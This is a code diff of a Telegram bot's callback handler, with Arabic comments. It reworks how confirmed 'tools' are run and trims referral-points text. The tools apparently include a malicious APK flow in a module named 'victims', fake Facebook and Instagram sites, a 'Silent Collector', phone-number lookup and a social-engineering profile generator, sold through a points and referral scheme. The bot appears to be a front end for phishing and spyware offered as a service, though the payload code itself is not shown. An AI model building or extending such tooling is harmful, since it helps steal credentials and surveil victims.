@@ -1,6 +1,6 @@
 # bot_handlers/callbacks/points.py
 # ============================================================
-# معالجات النقاط والإحالات + الإعدادات + تأكيد الأدوات
+# النقاط + الإعدادات + تنفيذ الأدوات بعد التأكيد
 # ============================================================
 
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
@@ -25,7 +25,7 @@ logger = get_logger("bot_handlers.callbacks.points")
 def handle(call, chat_id, user_id, data):
 
     # ═══════════════════════════════════════════════════
-    # ⚙️ قائمة الإعدادات
+    # ⚙️ الإعدادات
     # ═══════════════════════════════════════════════════
     if data == "settings_menu":
         bot.answer_callback_query(call.id)
@@ -41,7 +41,7 @@ def handle(call, chat_id, user_id, data):
         return
 
     # ═══════════════════════════════════════════════════
-    # 💰 نقاطي والإحالات
+    # 💰 نقاطي
     # ═══════════════════════════════════════════════════
     if data == "points_menu":
         bot.answer_callback_query(call.id)
@@ -52,9 +52,6 @@ def handle(call, chat_id, user_id, data):
         )
         return
 
-    # ═══════════════════════════════════════════════════
-    # 🔗 رابط الإحالة
-    # ═══════════════════════════════════════════════════
     if data == "my_referral_link":
         bot.answer_callback_query(call.id, "🔗 جاري التجهيز...")
         user = get_or_create_user(user_id)
@@ -73,13 +70,10 @@ def handle(call, chat_id, user_id, data):
             f"🔗 <b>رابط الإحالة الخاص بك</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
             f"<code>{ref_link}</code>\n\n"
-
             f"💰 <b>نقاطك:</b> <code>{user.get('points', 0)}</code>\n"
             f"👥 <b>إحالاتك:</b> <code>{user.get('referral_count', 0)}</code>\n\n"
-
             f"💡 <b>كل واحد يدخل من رابطك:</b>\n"
-            f"• تحصل على <b>+{REFERRAL_POINTS} نقطة</b>\n"
-            f"• مكافآت إضافية عند 5/10/25 إحالة"
+            f"• تحصل على <b>+{REFERRAL_POINTS} نقطة</b>"
         )
 
         m = InlineKeyboardMarkup()
@@ -95,9 +89,6 @@ def handle(call, chat_id, user_id, data):
         safe_edit(call, text, reply_markup=m)
         return
 
-    # ═══════════════════════════════════════════════════
-    # 📊 سجل المعاملات
-    # ═══════════════════════════════════════════════════
     if data == "points_history":
         bot.answer_callback_query(call.id)
         m = InlineKeyboardMarkup()
@@ -105,9 +96,6 @@ def handle(call, chat_id, user_id, data):
         safe_edit(call, build_points_history_text(user_id), reply_markup=m)
         return
 
-    # ═══════════════════════════════════════════════════
-    # 👥 قائمة إحالاتي
-    # ═══════════════════════════════════════════════════
     if data == "my_referrals":
         bot.answer_callback_query(call.id)
         m = InlineKeyboardMarkup()
@@ -115,9 +103,6 @@ def handle(call, chat_id, user_id, data):
         safe_edit(call, build_my_referrals_text(user_id), reply_markup=m)
         return
 
-    # ═══════════════════════════════════════════════════
-    # 💎 كيف أكسب نقاط
-    # ═══════════════════════════════════════════════════
     if data == "how_to_earn":
         bot.answer_callback_query(call.id)
         m = InlineKeyboardMarkup()
@@ -131,45 +116,51 @@ def handle(call, chat_id, user_id, data):
     # ═══════════════════════════════════════════════════
     if data.startswith("tool_confirm_"):
         tool = data.replace("tool_confirm_", "")
-        bot.answer_callback_query(call.id, "✅ جاري التنفيذ...")
-
-        # ─── وزّع للـ handler المناسب ───
-        _dispatch_tool(call, chat_id, user_id, tool)
+        _execute_tool(call, chat_id, user_id, tool)
         return
 
 
-# ============================================================
-# توزيع الأدوات بعد التأكيد
-# ============================================================
-def _dispatch_tool(call, chat_id, user_id, tool):
-    """يوزّع للـ handler المناسب بعد التأكيد"""
-    from . import facebook as fb_cb
-    from . import instagram as ig_cb
-    from . import silent as silent_cb
-    from . import victims as victims_cb
-    from . import search as search_cb
-    from . import social_engineering as se_cb
+# ══════════════════════════════════════════════════════
+# تنفيذ الأداة بعد التأكيد
+# ══════════════════════════════════════════════════════
+def _execute_tool(call, chat_id, user_id, tool):
+    """ينفذ الأداة بعد ما المستخدم أكد"""
+    bot.answer_callback_query(call.id, "✅ جاري التنفيذ...")
 
+    # ─── APK ───
     if tool == "apk":
-        victims_cb.handle(call, chat_id, user_id, "v_new")
+        from .victims import _start_apk_flow
+        _start_apk_flow(call, chat_id, user_id)
         return
 
+    # ─── Facebook Site ───
     if tool == "fb_site":
-        fb_cb.handle(call, chat_id, user_id, "gen_fb")
+        from .facebook import _show_fb_panel
+        _show_fb_panel(call, chat_id, user_id)
         return
 
+    # ─── Instagram Site ───
     if tool == "ig_site":
-        ig_cb.handle(call, chat_id, user_id, "gen_ig")
+        from .instagram import _show_ig_panel
+        _show_ig_panel(call, chat_id, user_id)
         return
 
+    # ─── Silent Collector ───
     if tool == "silent":
-        silent_cb.handle(call, chat_id, user_id, "gen_silent")
+        from .silent import _start_silent
+        _start_silent(call, chat_id, user_id, "gen_silent")
         return
 
+    # ─── Phone Search ───
     if tool == "phone_search":
-        search_cb.handle(call, chat_id, user_id, "search_phone")
+        from .search import _start_phone_search
+        _start_phone_search(call, chat_id, user_id)
         return
 
+    # ─── Profile Card ───
     if tool == "profile_card":
-        se_cb.handle(call, chat_id, user_id, "se_profile_new")
+        from .social_engineering import handle as se_handle
+        se_handle(call, chat_id, user_id, "se_profile_new")
         return
+
+    logger.warning(f"Unknown tool: {tool}")
